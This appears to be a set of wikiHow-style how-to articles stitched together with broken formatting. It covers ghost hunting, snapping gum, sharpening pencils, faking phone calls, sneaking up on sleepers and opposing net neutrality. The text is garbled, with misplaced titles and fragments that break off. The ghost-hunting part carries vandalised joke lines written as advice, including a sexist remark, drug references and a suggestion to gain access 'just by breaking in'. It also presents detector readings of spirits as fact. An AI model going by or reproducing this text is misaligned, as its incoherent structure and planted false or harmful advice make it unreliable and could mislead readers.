No smoking at the location, this can appear like mist on the photos, and you don't want to contaminate your evidence. Also see above about setting people on fire.
Watch for dust or dirt being stirred up in the area you are photographing. They can give false positive pictures. Unless they're pictures of dirt or dust, in which case they would be true positives.
All long hair should be tied back or under a hat, again this is to eliminate any false positive pictures and to give the skeptics less ammunition. Nobody believes hippies or women.
Remove or tie up any camera straps so you don't take a picture of that, it looks like a vortex when photographed if you've taken a lot of mushrooms.
Don't bother with your camera's viewfinder. Hold the camera out in front of you and aim at the area you want to take a picture of. Many newer digital cameras do not even come with view finders. This also helps in cold weather by keeping your camera away from your breath.
Watch for reflective surfaces and make notes of them. The flash reflected off shiny surfaces such as windows, polished tombstones, mirrors, eyeglasses, discarded beer bottles, etc. can look like an orb or other anomaly. Make note of street lights and any other light source that may appear on the film. Take pictures of them for comparison purposes.
Let fellow investigators know when you are taking a photo so that you don't get double flashes and the night scope operators can look away. If you think you have a double flash photo or any other false positive, log the picture number so you can exclude that photo from the batch when they are developed. Night scope operators can get eye damage if they are looking at a flash through the scope so this is important.
In cold weather be conscious of your breath so you don't photograph that, it'll look like ectoplasm mist. If you think you may have, log that picture number and discard it when you develop the pictures.
Many people like to ask the spirit if they can take their picture, it can't hurt. If the spirit doesn't answer, leave a few twenties in a tree to thank the spirit for their cooperation.
Take pictures anywhere and everywhere. If you feel something or someone else does, take a picture. Do you think you saw something? Take a picture. Take photos whenever you get positive readings on any piece of equipment.
Sometimes you will see an orb, mist or sparkles in your flash or others flashes. Take more pictures right there, you may be near a spirit.
You may only get about one or two pictures for every 50 you take. That's about the average, so don't get discouraged.
Don't pay for fancy developing. You can get photos developed anywhere. Just let them developers know to process and print every photo.

, These are some places you can start your ghost hunting at. These are suggestions and you should not limit yourself to just these -- spirits can be anywhere. Don't let the age of a building or area fool you. Also, remember, do not trespass.


Cemeteries - The age of the cemetery doesn't matter but the older it is, the more time it has had to accumulate restless spirits. Nonetheless, the age of the cemetery doesn't matter. Why cemeteries? Well there are theories such as they are portals to the other side or that some spirits are drawn to their former bodies.
Schools - Schools and former sites of schools may have the build up of psychic energies and imprints of all the highly emotional events that have transpired there.
Theaters - The actors have run the gamut of human emotions inside the walls of a theater, plus many have interesting haunt stories attached to them. The ones that don't are not going to be haunted.&nbsp&nbsp
Battlefields - These are great locations simply because of their nature. Many violent deaths in one area will always hold some spirits and psychic energy there.
Churches - There is a long history of the faithful returning to the church they worshipped at. They may be looking for the salvation they were promised and cannot find. Try between the seat cushions or in the Lost & Found box in the nave.






Hotels/Motels/Boarding houses - Many dark dealing and highly emotional events take places in these rooms.
Historic Locations - Many historic buildings, because of their age, have had more time to have spirits attach to them. These buildings are often open to the public and can give you an easy place to start. Many even have known histories of being haunted and you may be able to gain access to the building after hours after speaking with the caretakers or just by breaking in.
Books on Local Haunted Places - They let an author publish the fact the place is haunted so there is a chance they may allow you in to take a look.

Suck in air.",How to Snap Your Gum1," Any type of chewing gum or bubblegum should work. Chew a wad of gum until all of it is soft and flexible.


Sugared gum and sugarless gum have different consistencies, so you might want to try both kinds to see which is easier to snap.;
, Press it against the roof of your mouth with your tongue until it forms a flat, unbroken disc or rectangle.


There are a couple different ways you can flatten the gum. Any method you use for blowing a bubble should work, but stop before the gum is fully stretched out.

, Use your tongue to push the gum up behind your upper lip, in front of your upper front teeth. Wedge one end of the gum firmly in that area. Push the other end of the gum behind your lower teeth, on the inside of your mouth. The gum should still be all in one piece, without any tears.Some people put the lower end in front of the bottom teeth instead, or in the center of the mouth.

, Part your lips slightly, so there's a gap between them. Suck a short burst of air in quickly, and some of the gum should snap back into your mouth, making noise.


You might need to practice for a while before you can get this. Even once you learn it, it might not happen every time.

Especially if you get easily spooked, having a friend with you will help you keep your cool.Make sure you take a friend who can calm you down if you get scared. Taking a friend who is very scared about supernatural things will only make your ghost hunt harder. Bring someone who believes in ghosts or supernatural activity and is not easily scared.
When you visit a site, make sure both of you have your phone on. That way if one of you gets lost or separated from each other, you'll easily be able to find each other again.;
, Ghosts can be found at many different sites -- they don't have to be haunted. However, haunted houses or areas will probably grant you the best opportunity to find a ghost. Decide where you want to look for ghosts so that you can establish a game plan on when to visit those sites. The best way to find a ghost is by visiting a place where someone has already encountered a spirit.You can often find haunted houses or haunted areas by visiting a city's website. Some towns even have ghost tours, so visiting one of those may be a great opportunity to find a ghost.
Think about areas where you or others have encountered paranormal activity. Have there been times you have seen objects moving on their own or sudden changes in temperature? If these events can't be explained scientifically, it may be a sign of paranormal activity.
Some other common areas ghosts or spirits may haunt are hospitals, mental health facilities, old theaters/movie lots, battle grounds, orphanages, prisons, cemeteries, churches, and nursing homes.
If you are located in New York, two places to visit with high EMF levels (electromagnetic field levels) are Algonquin Hotel and White Horse Tavern., This is a wise step, because if you just go to your site at night, you won't be as familiar with your surroundings. Go to your locations during daylight so you can feel them out. Memorize where things are located and think about where a ghost may be hanging out. Then, when you go back at night you'll have a better sense of the place and won't risk getting lost or easily frightened.If one of your sites is private property, always contact the owner first before you just show up at their place. You may meet a frustrated owner or worse if you just show up. You want to get on their good side so that they are willing to show you around their property.Sometimes if a site is haunted by someone who died at the location, a good time to visit that site is on the anniversary of that person's death.

, Ghosts don't only haunt places at night -- sometimes the best times to haunt are when no one is expecting it. So, as you are visiting your sites, take notes about unusual things you have seen. If you visit a place and no unusual activity seems to be happening, you might cross it off your list. If your intuition tells you something strange is going on in a location, you might put it at the top of your list.You want to narrow down your list so you can really focus on the places that feel different. That way, you aren't spending hours investigating locations that have no paranormal activity. Taking notes while you research is a great way to keep track of all of your information.

, As previously mentioned, always take a friend with you, but a group is even better. If you have three or more people looking for a ghost, the odds of finding one will increase. The more people you have, the more spread out you can be. Pick a leader of the group -- the person people can go to if they have spotted anything unusual. It's best to go out between 9 p.m. and 6 a.m., when it is dark.Try to visit one of the locations you went to earlier in which you sensed a presence or someone had already encountered a ghost. Ghost hunting is tricky and the odds of you finding a ghost are slim, but if you really want to see a ghost it's worth a try.

, While you are ghost hunting, you'll want equipment to document your hunt. That way if you find a ghost, you can catch it on camera so people will know you weren't just imagining things. Have everyone in your group equipped with a digital camera and instruct them to keep it on at all times.A good camera to use is a GoPro or something you can attach to your body that you won't have to constantly hold. That way, if you get spooked you won't risk dropping the camera and losing footage.
You can also bring a thermometer to watch for temperature changes, and an electromagnet field detector. This is the modern ghost hunter's tracking device, and helps them track energy sources by detecting fluctuation in electromagnetic fields. It's helpful to bring this tool when you are first visiting a site, so you can mark regularities. Then, when you actually go ghost hunting, you'll know when something changes.
Before you go out, it could be good to say a prayer of protection. Ghosts are tricky beings, and you never know if you are going to encounter a peaceful or dangerous ghost. Try to calm the spirits in the house so you remain safe.Try to avoid using flashlights if you can. A ghost will likely hide if a bright light is thrown into a room. Use night goggles for the best vision.
The more energy you bring to a ghost hunt, the better luck you will have at encountering a spirit. If you go with a group that feels very apathetic about the hunt, you probably won't see a ghost. Make sure you bring a group of people excited and eager to look for spirits.

, Now that you are equipped, it's time to go find a ghost. Using all of your knowledge you have gained so far, walk around your area looking for signs of paranormal activity. As mentioned earlier, pay attention for strange sounds, temperature changes, or even your intuition.If you feel a dark fog or a presence in a room, it may be a ghost that hasn't revealed itself to you yet. Wait patiently to see if the ghost will come out. If you make sudden movements or leave the room, the ghost may get spooked or you may loose your opportunity to see it.
Make sure every room and every nook and cranny is visited. Ghosts can be anywhere so you don't want to ignore a space just because you doubt a ghost would be there.
Watch the gauge on the EFM to see if there is a spirit or presence in the room. If there is something else in the room besides you, the gauge will make a sudden movement to the right. If the gauge remains on zero or to the left of the meter, there's probably nothing in the room.

, There are different ways you can summon a ghost, and many ghosts will not come out just because you have summoned them. However, if you are in an area that someone has spotted a ghost already, or you feel it is haunted, you can try out these techniques:Ouija Board: Place this in the room you are in. Place your hand on the guider and allow the ghost and spirits in the room to guide you through the board so they can send you a message.
Planchette: This heart shaped, flat piece of wood was used to produce mysterious messages that made people believe it helped them communicate with spirits. Bring it with you and place it in the room you are in.
A medium: A medium is someone who has the ability to communicate with the dead. If you really want to find a ghost, bringing a medium with you on your ghost hunt is the best chance you have. They know specifically how to summon ghosts and will be able to communicate to the spirit for you.
Communicate with the ghost: If all else fails, you can try to communicate with the ghost yourself. Using a gentle voice, simply ask the ghost to show themself. Tell the ghost you are there on peaceful terms.

, If you have a big group and are able to cover the area quickly, try to spend an hour in your area. If you are assigned two rooms, spend 30 minutes in each room, looking around. If you see no signs of a ghost, move on to another room.


If you have a much larger area or a smaller group, give yourself enough time to explore each room efficiently. Use the notes you previously took to visit the areas that are more likely to have a ghost. Take notes in each area so that should you decide to visit it later, you'll know what to look for.
When you are in a room, remain quiet. You want to respect the dead and the spirits, and this will give you more protection as well. Encourage your team to move quietly through the location, with no laughter or horse play.Actually seeing a ghost may be difficult, but you might be able to listen for a ghost. Take a tape recorder or your phone with to a site. Then, place it in a room on the floor or a table and start recording. Begin asking questions to the spirits in the room. After you've finished your hunt you can go back and listen to the recording, listening for any spirits that might have spoken through the white noise.

, After everyone has spent a good amount of time in their assigned locations, come back together. Share any insights or findings you have, and compile all the information together into one document. If someone else saw a ghost and you want to see it, don't go as a large group. Go one by one in the area, giving yourself enough time to find the ghost.


If no one saw a ghost during their time exploring, don't give up. Move onto another location and consider coming back to this location another time. If you visit the location one or two more times and don't see a ghost, then cross it off your list. There probably isn't a ghost or spirit there, or if there is, they aren't going to reveal themselves.
You may want to look over the footage you took while you were in rooms. Your camera and audio may have been able to catch things you weren't yourself. Together you can watch each piece of footage to see if there was a presence in the room you didn't detect yourself.
If you experience negative energy in a house and feel your lives are in danger, get out! Risking your safety is not worth it just to see a ghost. If a ghost feels disturbed they may not respond well to your presence., Many people who encounter ghosts usually experience them through sounds and mysterious hazes. People don't often see a ghost in complete form, so have realistic expectations when entering a location. You're more likely to experience the spirit through noises, temperature changes, and hazes or through things that appear on your video or audio after you have left the location.If they do see a ghost in its complete form, it's usually by mishap -- someone was just walking around doing their own thing and they noticed a ghost. A ghost is more likely to appear this way, because they don't always like to be summoned and disturbed.

, Before you begin your ghost hunt to search out a ghost, consider reading a book or two about ghost hunting. A book may provide valuable information about how to locate a ghost, where to find a ghost, and what to do when you an encounter a ghost. Searching for a ghost as an amateur may be a dangerous task, so do some research before you go at it yourself.Some books to pick up when you are learning about ghost hunting are: The Ghost Hunter's Survival Guide by Michelle Belanger - Protection Techniques for Encounters with the Paranormal; Paranormal Technology: Understanding the Science of Ghost Hunting by David M. Rountree; Hauntings and Poltergeists: Multidisciplinary Perspectives edited by James Houran & Rense Lange; Ghosts, Apparitions & Poltergeists - An Exploration of the Supernatural Through History by Brian Right; and Ghost Hunter's Guidebook by Troy Taylor.

, Documentaries, which are real life events, can be a great place to start when you are learning about finding a ghost. The documentaries often feature professionals, which will key you into tips and tricks on how to find ghosts.


Some good documentaries to watch before you go exploring are Ghost Adventures (2004), Enfield Poltergeist, Ghost Hunters, The Dead Files, A Paranormal witness, and Celebrity Ghost Stories., People with experiences are often the best sources to turn to when you are trying to find a ghost. Ask them where they saw the ghost, when they saw it, and what the ghost looked like. Learning from someone who has personal experience may help you better equip yourself to find a ghost.


If you don't personally know someone who has seen a ghost, look up the history of your town to learn about different supernatural encounters. You are bound to encounter a story of a house or location where someone thought they saw a ghost. If you can't find any in your town, you will probably have some luck in finding a story in a city close to yours.
You can also visit internet boards about ghost hunting or ghost encounters to get advice from people. These sites are good places to chat with people about their experiences or to connect with someone who also wants to go on a ghost hunting pursuit.

, Many people believe ghosts don't exist, and some people will create paranormal activity just to try to convince others ghosts are real. When you are doing research or even ghost hunting, try to stay realistic. Don't convince yourself you saw something paranormal just because the wind blew a little harder than usual. Look for very clear signs of ghosts -- not just your own imagination.


Some clear signs you can look for are actual people, or movements of objects that aren't affected by the current weather or atmosphere. Sounds that are strange and unusual (not just the wind moving through the trees) may also be good things to pay attention to. You can also listen for voices coming from the walls and cracks of buildings that aren't caused by the people around you. Pets acting strange or dogs barking at the air may be a sign of something supernatural., Someone who is suffering from isolation or has been in a situation where they are experiencing high levels of stress often imagine ghosts around them. These ghosts or spirits usually help comfort them and guide them so that they can overcome their current situation. Keep in mind that many people you talk to may be experiencing these situations, but aren't actually seeing real ghosts.These imaginings often come from someone's hallucination and occur from the changes in brain chemistry due to stress, lack of oxygen, monotonous stimulation, or a buildup of hormones.

, These are located all throughout the U.S. and will often help guide you to the most local paranormal organization. Volunteering with an organization like this will help train you and give you a team of people that can help in your pursuit of ghosts.One site to check out is the Online Paranormal Society Directory. It can help lead you to nearby societies or companies and has almost 3,000 listed in the U.S.

Use sandpaper.,
Use a nail file.,
Rub your pencil against a rough foundational structure.",How to Sharpen Your Pencil at School Without a Sharpener1," You may find yourself in a situation where you don't have any back-up writing tools and simply can't ask to to borrow a pencil. If so, you'll need to get creative. If you are able to find a rough surface on which to rub your pencil tip, you should be able to bring it back to a sharp tip. Sandpaper will work exceptionally well for this.









If you are in shop class, then it shouldn't be too hard to find a piece of sandpaper floating around. Of course, you probably don't have this in your desk or bag, but if you are a habitual pencil-breaker, and if your teacher is notorious for not letting students up out of their desks, then keep a small square in your desk.Simply rub your pencil along the rough side of the sandpaper, taking care to rotate your pencil every few strokes, and you should soon see a sharper tip.;
, You're probably more likely to have a nail file on hand. It's a smart idea to carry an emery board with you or keep one in your desk. You'll be able to smooth out both your nails and any dull pencil tips!









The rough grain on the emery board should work well to sand down the wood on your pencil and shave the graphite to a sharper point. Simply drag the edge of your pencil tip down the nail file, taking care to rotate consistently.
If you carry nail clippers, many have a metal nail file attachment that swings out. It may be rough enough for you to use to sharpen your pencil, as well.

, If your pencil breaks and you're without a sharpener (or nail file or sandpaper), take a look around you: Are you sitting next to a brick wall? Are you on pavement or concrete?









These rough surfaces should work well to help you out of your predicament: you should be able to hone your pencil tip by rubbing it firmly on the pavement, against a brick wall, or even on the mortar in between the bricks.

Form the gum into a bubble.,
Fold it into a dumpling shape instead.,
Practice snapping repeatedly.",How to Snap Your Gum2," Flatten the gum into a disk, just like you would in the normal snap method. Stick your tongue through the disk without breaking it, then withdraw your tongue and clamp the edges together to make a a sealed air bubble. Chew to pop this bubble and make a snapping noise.


Blowing into the bubble as you pull out your tongue might help., Some people find it faster to fold the gum in half instead. Bring one end over to the other, sealing the sides and ends with your teeth and the sides of your mouth. If you manage to do this correctly, you'll end up with a ""dumpling"" of air, which pops just like an ordinary bubble.

, If you want to snap gum many times as you chew, you'll have to practice one of the two steps above until you can do it rapidly or even unconsciously. Once you learn these larger motions, you can try making the bubbles smaller and smaller, until you can form them just by folding the gum over and chewing. Chewing too hard or too soft will prevent the bubbles from forming and making noise, so it takes quite a bit of practice before you can get a steady stream of snaps."

Use a knife or scissors.,
Use other sharp edges.,
Twist your pencil through the hole in your ruler.,
Use the edge of your key and/or the keyhole.,
Use a screw.,
Use nail clippers.,
Use your nails and teeth.",How to Sharpen Your Pencil at School Without a Sharpener2," If you have a utility knife, x-acto knife, or pair of scissors available, you should be able to sharpen your pencil with little effort. Simply scrape the edges of your pencil along the sharp edge of any of these tools.









If you use scissors, open them as wide as they'll go. Hold the blade (whether it's the scissors blade or knife blade) firmly in your non-dominant hand, and the pencil in your dominant hand.
The pencil should be at about a 45 degree angle. Pull the pencil down towards you, scraping the wood and graphite against the sharp edge at that 45 degree angle. Rotate the pencil and repeat this motion until you get a good enough point.
DO NOT draw the blade towards you. Instead, hold it steady and move the pencil along it.DO NOT bring a knife or x-acto blade to school with the intention of having it on hand for this purpose. We only suggest using these sorts of blades in the instances when they are readily available and permitted by school policy (perhaps in art class or shop class).

, You most likely aren't allowed to keep a blade or x-acto knife at school, and you may not have scissors. If so, look through the supplies you have for unexpected sharp edges.









For example, the edge of your ruler may be sharp enough to help you out, particularly if you have a metal ruler (even some plastic rulers may work—it doesn't hurt to try).
Hold the ruler firmly in your non-dominant hand and scrape the pencil down along the edge carefully and slowly. Rotate the pencil every couple of strokes, and you should be able to sharpen it up a bit.

, Most rulers have holes so that they can be placed in three-ring binders. If yours does, you may be able to use this hole to push back the wood on your pencil to reveal the graphite below.









Once you've either pushed back the wood (or you may even be able to shave some of it away), you can try to sharpen up the tip by scraping it along the rough edge of the hole or use some of our later advice on how to sharpen just the graphite tip.

, Most metal keys have fairly sharp edges, and they likewise have holes for placing them on key rings. In a pinch, you may be able to repurpose your key as a make-shift pencil sharpener.









If your tip has broken off completely and you can't see any graphite, then start by using the keyhole to push back the wood.
Once you've revealed the graphite, you can gently scrape it along the sharper edge of your key until you are able to write with it again.
Your final result may not be pretty, but it should be sufficient to get you through the rest of your writing or drawing task.

, So you don't have a nail file, scissors, a ruler, or a key! What should you do? Look around your chair and desk to see if you can spot a Philip's head screw (you'll see a cross on the top of the screw instead of a single line).









If you can reach the screw easily, leave it in place and place your pencil tip in the top of the screw. Rotate your pencil clockwise. This should grind down the wood and reveal more graphite.
If you are able to find a loose screw, you can then use the side of the screw to continue to sharpen the pencil. We don't, however, recommend that you try to remove any screws: you don't want to risk collapsing your desk or chair!

, If you keep nail clippers in your pocket or desk, you should be able to use them to help you out of this jamb. We talked above about how you may be able to use the attached nail file. Even if your clippers don't have a file, though, they can still be useful.









Simply make tiny clips all along the tip of your pencil to trim away the wood. This will work best if you hold the pencil horizontally with your non-dominant hand and hold the clippers perpendicularly with your dominant hand. This should line up the cutting edge of the clippers with the wooden tip of the pencil.

, If you're not adverse to using your nails and teeth as tools, you may be able to use them to push back (or carefully nibble away) some of the wood of your pencil. Once you've revealed enough of the graphite to begin working again, consider honing it to a tip using some of our other suggestions.


Be very careful not to swallow any of the wood shavings. You also want to avoid ingesting the graphite—not because it's toxic like old lead pencils were—but just because it's gross! You also don't want to discolor your teeth.

Lightly sketch lines on piece of paper.,
Rub your pencil on a folder or piece of paper.,
Rub your pencil tip against your shoe.",How to Sharpen Your Pencil at School Without a Sharpener3," If you haven't broken your pencil tip completely and only need to return a dull point to a sharper tip, you may be able to do so by very lightly sketching on a piece of paper.









Your pencil should be nearly flat against the paper: hold it at about a 30 degree angle and sketch thin lines, rotating your pencil every couple of sketches.

, A slight variation to the above technique would be to hold the pencil at the same angle against a piece of paper or folder and gently move your pencil tip back and forth several times to create a rubbing (imagine that you are trying to evenly shade in a small area).









Keep the pencil as flat as possible against the paper, and rotate your pencil frequently. This may shave down some of the graphite so that you get a longer, sharper point.

, If you don't want to mark up your paper or if you don't have a spare folder handy, try rubbing the edge of your dulled pencil tip against the rubber of your shoe sole.









Again, be sure to rotate the pencil and don't push too firmly in order to protect against snapping off the tip or rubbing it down altogether.

Have back-up pencils.,
Ask to borrow someone's pencil.,
Use a mini-sharpener.,
Switch to a different writing implement.",How to Sharpen Your Pencil at School Without a Sharpener4," If your pencil tip breaks off completely, you may be out of luck and won't be able to restore it to a point. The best way to handle a broken pencil is off course to have spare pencils available.


The smartest strategy for dealing with a broken pencil is to not have to try to sharpen it, and to always carry at least a couple more than you think you will need.

, If you can't get to the pencil sharpener, you may be able to draw upon the pity of a fellow classmate. You may even be able to get someone to offer you a spare pencil without having to talk: simply sigh and hold up the broken tip. With luck, someone near you will notice and will be willing to hand you an extra.


Take care not to make your situation worse, though, by speaking during an exam or important assignment. You don't want to get in even worse trouble or get your friend in hot water by forcing them to talk to you. You'll both risk failing the test or assignment.

, If you have a tendency to break pencils or if you dull the point quickly because you press down firmly when writing or drawing, you can avoid creating problems for yourself by constantly asking to get up and use the sharpener by keeping your own in your desk or pocket.


You can purchase mini sharpeners at any office supply store or big-box store like Target or Walmart. You can also use a make-up sharpener (usually designed to sharpen eye and lip liners).

, So long as you aren't taking a standardized test which requires you to use a pencil, you may be able to switch to a pen or even crayon to complete your work. With luck, your instructor will understand.

Text instead of call.Generally speaking, texting is a lot easier to fake than a full-fledged phone call.",How to Pretend You Are Talking on the Phone," If you have a smartphone, look into downloading one of these apps. It can give you the initiative you need to get your fake call started.


Fake Call, Fake Call 2, and Fake-A-Call-Free are all examples of apps you can download for this reason.;
, Setting an alarm on your phone will result in it ringing at a given time. If you're able to plan in advance or know you're heading into a situation you'll want to be excused from, set an alarm to go off. When your phone rings, you'll have a reason to ""answer"" and begin your phone conversation from there.


If you're already in an uncomfortable setting, you can pretend to send a text message while you're preparing an alarm.
If you need your phone to ring immediately, set your alarm to go off a minute from now.

, You can always lift a phone to your face without a ring or dial tone. If the area you're in is loud enough, other people around you will simply assume they couldn't hear your phone vibrate in your pocket. This is a good option if you need to fake a call in a hurry ad have no time to prepare in advance.


If you're faking a call, it's a good idea to put your phone on silent. This will cancel out the chance of a real person attempting to call you while you're faking a conversation.

, If you're in a situation where it's acceptable to make phone calls, you won't need to wait for the phone to ring to pick it up and make it happen. Pick up your phone, and pretend to press in some numbers. Bring the phone up to your ear, and wait a few seconds while the person on the other end supposedly picks it up. After that, you may begin your phone conversation.


It's a good idea to press real buttons if someone may be able to hear the tone dial (or lack thereof.) It may be helpful to actually dial up and call a number. When you do, immediately ""hang up"" the call but keep going as if you were about to talk to someone on the other end. With most phones, there is usually the space of a couple of seconds after calling before it goes through to the other line. Make a point of hanging up before this happens. If you do, there's a chance the number you called will attempt to call you back.

, Although the other person talking would be very quiet to other people whose ears aren't up near the receiver, you can still often hear an indistinct chatter if someone's on the phone nearby. Because you obviously won't have this if you're faking a phone call, it's important to keep enough distance from other people that they wouldn't be able to hear the chatter if it was there. With enough space between you and others, they won't be able to suspect there's no sound coming through.


This issue is averted if you're wearing earbuds with your phone, or are in a loud setting.

, Almost all phone calls begin with a simple greeting. Saying something like ""Hello"" or ""Hey, what's up?"" before you start talking on the phone lends a greater sense of authenticity to your phone conversation.

, Although it's not unheard of that people will call each other just to catch up, a faked phone call is easier to accomplish if you know what the conversation's supposed to be about. Give yourself a good idea about the reason for calling, especially if you're the one supposedly initiating the conversation. Even if you spend a lot of the conversation ""listening"", your responses will be more believable if you offer more than generic, one word responses.


A generic idea for a phone call could be making dinner plans for later on that week. A more general call to check up on how someone's doing is also believable.
Proper planning allows for better improvising.

, A phone conversation tends to be two-sided. That means you should spend at least half of your session trying to look like you're listening to someone on the other end. After giving your responses, wait a while and try to imagine what the other person would be saying. This will occupy your mind while you're supposed to be listening, and give you a better idea how to keep the fake chat going.

, When we're talking on the phone with someone, you may be physically reacting to the person on the other line. A fake phone call can appear more believable if your face changes as if you were hearing someone talk. This makes it important to have some idea what your fake conversation is about, as it will give you some indication what your reactions should look like.


Don't change your face too often. There should be one facial reaction per ""response"" on average. It's also important not to overdo your expressions. Don't make it seem like you're putting on a show for whomever's nearby.

, Authentic-sounding conversations will have a degree of unpredictability to them. Some phone calls will have both people talking at once or accidentally interrupting each other. Stopping yourself in mid-sentence makes it sound like there's a real person on the other end talking to you.

, Much like the case with greetings, there are expected, routine ways you are expected to end a chat with someone. Saying ""Goodbye"" or ""Talk to you later"" will signify to both parties (and whomever's watching you make the call) that the call is over. If and when you choose to end the call, make sure you don't have a reason anymore to fake the call. Chances are you won't be able to use it as a tactic again once you've hung up. Picking up the phone again will look suspicious.


If you run out of a reason for faking your phone conversation, you won't need to end the call in any particular way
Remember to make it look like you're ending the call on the phone itself. Press the phone's ""end call"" button and turn it off.

, Although it can be a useful tool, there's a risk of being found out and having your efforts backfire. With that in mind, it may be a good idea to consider other options first.

, If you're trying to get out of a conversation, for example, you might say tell the person you're talking to that you have somewhere you need to be. This may be done with or without the help of a phone. If you want to look like you're ""on the go,"" keep your phone at hand. This will make it look like you're already doing something or expecting someone to call.

, If you're trying to look busy or occupied, there are probably lots of things around you that you could focus yourself around. Cleaning or starting a real-life conversation with someone are good ways to get busy quickly. If it looks like you're doing something, you'll be able to excuse yourself from the situation without giving a reason to whomever's around.

, Fake texting (or merely browsing on your phone) is a more common way of looking busy, and it can alleviate awkwardness. Just make sure no one can see your phone screen. If they do, they'll be able to tell you're faking it.


Texting isn't as effective at getting you out of situations, as it's often quick and non-committal. If you need to get out of a situation fast, you should go straight to a call.

Gather the needed materials.,

Monitor their bedtime routine.,
Keep your eyes on them.,
Listen for clues.,
Be patient.,
Wear quiet clothing.,
Keep your body from giving you away.,
Control your breathing.,
Plan your path.,
Prepare your eyes for darkness.,
Walk silently by rolling your feet.,
Freeze if they move or are facing you.,
Hide in the shadows.",How to Sneak Up on Someone When They're Sleeping," If you are sneaking up on someone in your family, or a person you live with, it is likely that you know their bedtime routine. Most people learn a bedtime routine at a very young age. It may change slightly over time, but most people have certain things they do before they go to sleep.A bedtime routine can involve things like brushing teeth, grabbing a glass of water, taking a bath or reading a book.
Pay close attention for a few nights to learn the routine of the person you want to sneak up on.;
, Beyond their routine, the person’s body can give them away. Watch for cues that they are getting sleepy. If they are yawning, rubbing their eyes, or beginning to nod off, you know that they will be sleeping soon.


They may even doze off right in front of you, making sneaking up on them really easy.

, If they have gone to bed and closed the door, listen closely for clues that they are sleeping. Beyond that, you also want to listen for warnings that they may still be awake. Stay close and listen carefully to figure out what they are doing.


You may hear them turn the television off, switch off the light, or start snoring.
You could hear the bed springs squeak if they are rolling around, they may cough or get up to go to the bathroom

, Don’t act too early. In fact, just when you think the person is asleep, wait a little while longer. You are more likely to wake someone who is in the first or second stage of sleep, than when they reach a deeper sleep. Give yourself and the other person a few extra minutes to fall deeper into sleep before you pounce., Some items of clothing can make noise when you walk. Avoid wearing something that is going to give you away. A good choice of clothing would be some flannel sleeping pants, a cotton t-shirt and some socks to keep your steps quiet.


Steer clear of things like wind pants that swish at the thighs, tennis shoes which could squeak on wood floors, and even jeans may pop in the crotch area.

, Don’t let a cough or a sneeze sneak up on you when you are trying to sneak up on someone else. Do everything you can to avoid coughing or sneezing, and suppress these urges if you feel them coming on.


Wet your throat by drinking a glass of water before you begin your mission. Try sucking on a cough drop while you sneak around.Blow your nose before you start to keep anything in there from making you sneezy. If you do feel a sneeze coming, plug your nostrils, then pull to stretch your nose., You may feel compelled to hold you breath, but the volume of air in your lungs will cause your body to react. You are required to exhale and if you need air, your lungs will eventually gasp for it. Instead, take slow, controlled breaths.


Breathe in slowly through your mouth for eight counts, then exhale through your mouth for eight counts to keep your breathing slow, even and quiet.

, Avoid creaks and squeaks. Creaky floors and squeaky doors could wake the person up and give you away. Walk around the house in advance and learn what parts of the floor creak and which doors squeak when you open them, then avoid those areas or fix the noise.


Stairs tend to be especially creaky because they have so many pieces of wood put together to make the staircase.If there is a staircase between you and the person you are sneaking up on, make sure you cross the stairs before they fall asleep.
Walk through open doors, or put some petroleum jelly on the hinges before you have to open them sneakily., You don’t want to have to turn on any lights. It is important to adjust your eyes to the darkness, so you can navigate your path to the sleeping person. Give your eyes time to adjust to the darkness so you don’t bump into anything on your way.Wait in the dark for ten minutes to allow cones of your eyes to adjust to the darkness.

, A flat foot makes more noise. To get really close to someone without waking them, step forward and set down your heel first. Roll along the outside of your foot from your heel to your pinky toe.Put your foot firmly down before you put weight on it.
Stay balanced. Don’t pick up your other foot until your weight is firmly balanced on your planted foot.
Keep it slow. It should take a full 20 seconds to complete three steps.

, They may hear you or detect that there is someone else in the room. If the are already facing you or you hear them rolling around, stop moving and try to blend into the dark.You may have to stay frozen for several minutes while you wait for them to settle back into sleep.

, No matter how dark the room is, there is probably still a little ambient light coming from the moon or street lights. The thing that will really give you away is your silhouette. People may look around if they suspect your presence, but they will look around at eye level.


Stay low to the ground and hide behind objects to avoid being visible.

Get an empty plastic water bottle, preferably an Ozarka water bottle, or around that size (preferably the cheapest bottle there is).,
Twist the bottle in the center or at the top of the bottom third of the bottle.

The reason for this is bottles from Aquafina, Dasani, and other name brands have thicker plastic, making Step 2 harder.;

Often, the bottle will emit white vapor, caused by the water droplets inside the bottle evaporating from the quick pressure change. It is not dangerous to sniff it, if one is so inclined.

Talk to friends and family about net neutrality.,

Make arrangements to meet with your congressional representatives.,
File a comment with the FCC.",How to Take Action Against Net Neutrality," If you want to take action against net neutrality, you must first understand the arguments of people who support it so you know how to counter those arguments.For example, one of the arguments in support of net neutrality is that it prevents ISPs from discriminating against some content providers in favor of others, allowing established content providers to pay for priority access to their material.
However, you can counter this argument by pointing out that some content, such as streaming movies and music, requires greater bandwidth than others. In a free and open marketplace, those content providers can pay ISPs for their customers' use of this increased bandwidth, thus guaranteeing that their customers can watch movies and listen to music without slow-downs or interruptions.
People who support net neutrality also argue that in today's society, the internet is becoming essential to everyday life, business, and commerce. Therefore, ISPs should be regulated in the same way other essential services, such as electricity, are regulated.
You can counter this argument by pointing out that excessive regulation of utilities provides no incentive for companies to upgrade their existing wires and cables that bring their services to people's homes. By de-regulating the internet and allowing ISPs to compete with each other, ISPs have a market incentive to upgrade their systems to provide faster, more reliable services than their competitors.;
, Larger organizations opposed to net neutrality can give your voice more power and authority, especially when you are talking to elected officials.Many of the organizations opposed to net neutrality are trade groups that represent major media interests and telecommunications companies.
However, there also are conservative public action groups such as American Commitment which support grassroots efforts and individual activism against net neutrality and other issues, with a focus on decreasing federal regulation.

, You must understand the way current federal laws and regulations work if you want to propose changes to those laws that would make the internet faster and more efficient.A lot of people don't understand net neutrality, leaving them open to the simplistic argument that net neutrality must be good because neutrality means not discriminating or preferring one thing over another.
However, the true issue involves free competition in the open marketplace as opposed to the stiff regulation of public utilities. Understanding FCC regulations helps you make stronger, more nuanced arguments against net neutrality.
For example, net neutrality proponents want ISPs regulated as public utilities, but the internet is not a public utility. The servers and cables that bring the internet into homes are privately owned. You must subscribe to a service to have internet, and you have many services to choose from. These services compete with each other for customers' business.
In contrast, your home already is wired for electricity – you simply call the power company and have it switched on. Regulating the internet as a public utility thus discourages ISPs from upgrading their equipment to bring faster and more reliable internet, since the lack of competition eliminates any incentive to improve the quality of the service they provide.

